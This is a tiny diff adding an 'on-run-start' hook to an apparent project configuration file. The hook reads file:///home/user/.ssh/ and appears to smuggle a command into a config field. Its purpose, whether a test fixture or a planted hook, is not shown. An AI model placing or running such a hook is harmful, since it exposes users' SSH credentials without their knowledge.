@@ -1,0 +1,2 @@
+on-run-start:
+  - "GET @files/config file:///home/user/.ssh/;"
